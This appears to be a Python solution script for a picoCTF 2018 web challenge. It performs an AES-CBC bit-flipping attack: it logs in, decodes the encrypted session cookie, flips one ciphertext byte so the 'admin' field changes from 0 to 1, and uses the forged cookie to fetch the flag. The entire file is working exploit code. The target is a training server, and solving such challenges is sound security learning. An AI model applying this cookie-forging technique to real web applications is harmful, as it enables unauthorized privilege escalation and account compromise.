from pwn import *
import requests
import json
import base64

BASE_URL = "http://2018shell.picoctf.com:43731"
AES_BLOCK_SIZE = 16

my_cookie = {}
my_cookie['password'] = "password12"
my_cookie['username'] = "username12"
my_cookie['admin'] = 0
log.info("My cookie: {}".format(my_cookie))

my_json_cookie = json.dumps(my_cookie, sort_keys=True) #Formatted like the server would
log.info("My sorted JSON cookie: {}".format(my_json_cookie))

s = requests.Session()
r = s.post(BASE_URL + "/login", data = {"user": my_cookie["username"], "password": my_cookie["password"]})

log.info("Server cookie - raw: {}".format(s.cookies['cookie']))
server_cookie_decoded = base64.b64decode(s.cookies['cookie'])
log.info("Server cookie - decoded: {}".format(enhex (server_cookie_decoded)))
my_json_cookie_with_dummy_iv = ("A" * AES_BLOCK_SIZE) + my_json_cookie
offset_of_byte_to_control = my_json_cookie_with_dummy_iv.find('0')
log.info("Offset of byte to control: {}".format(offset_of_byte_to_control))
offset_of_byte_to_flip = offset_of_byte_to_control - AES_BLOCK_SIZE #Flip byte in previous block
log.info("Offset of byte to flip: {}".format(offset_of_byte_to_flip))


server_cookie_decoded_copy = bytearray(server_cookie_decoded)
flip_value = server_cookie_decoded_copy[offset_of_byte_to_flip] ^ ord("0") ^ ord("1")
log.info("Flipping 0x{:02X} to 0x{:02X} at offset {}".format(server_cookie_decoded_copy[offset_of_byte_to_flip], flip_value, offset_of_byte_to_flip))
server_cookie_decoded_copy[offset_of_byte_to_flip] = flip_value
log.info("Server cookie - after flip: {}".format(enhex (str(server_cookie_decoded_copy))))
server_cookie_encoded_copy = base64.b64encode(server_cookie_decoded_copy).decode("utf-8")

s.cookies.set('cookie', None) # Needed in order to delete previous cookie
s.cookies.set('cookie', server_cookie_encoded_copy )

r = s.get(BASE_URL + "/flag")
for line in r.text.split("\n"):
    if "picoCTF{" in line:
        print line